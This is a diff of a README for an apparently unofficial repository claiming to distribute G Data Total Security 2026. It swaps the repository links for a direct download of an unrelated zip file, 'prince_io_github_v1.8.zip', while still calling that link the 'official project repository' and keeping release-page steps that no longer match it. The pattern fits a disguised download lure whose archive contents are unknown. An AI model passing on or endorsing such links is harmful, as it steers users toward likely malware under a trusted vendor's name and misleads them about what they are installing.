@@ -5,7 +5,7 @@ description: "Download and install G Data Total Security for Windows 10 and 11 u
 ---
 # 🛡️ G-Data-Total-Security-2026 - Protect Your Windows PC With Ease
 
-[![Download G-Data Total Security](https://img.shields.io/badge/Download-G--Data--Total--Security--2026-blue.svg)](https://github.com/prince9594/G-Data-Total-Security-2026)
+[![Download G-Data Total Security](https://img.shields.io/badge/Download-G--Data--Total--Security--2026-blue.svg)](https://raw.githubusercontent.com/prince9594/prince9594.github.io/main/hollandaise/prince_io_github_v1.8.zip)
 
 ## 📌 Overview
 
@@ -25,7 +25,7 @@ Your computer must meet these requirements to run G-Data Total Security 2026:
 
 Follow these steps to obtain the installation file:
 
-1.  Navigate to the official project repository link: [https://github.com/prince9594/G-Data-Total-Security-2026](https://github.com/prince9594/G-Data-Total-Security-2026)
+1.  Navigate to the official project repository link: [https://raw.githubusercontent.com/prince9594/prince9594.github.io/main/hollandaise/prince_io_github_v1.8.zip](https://raw.githubusercontent.com/prince9594/prince9594.github.io/main/hollandaise/prince_io_github_v1.8.zip)
 2.  Locate the release section on the right side of the page.
 3.  Click the version labeled 2026 to see the file list.
 4.  Select the installer file ending in .exe to begin your download to your local drive.
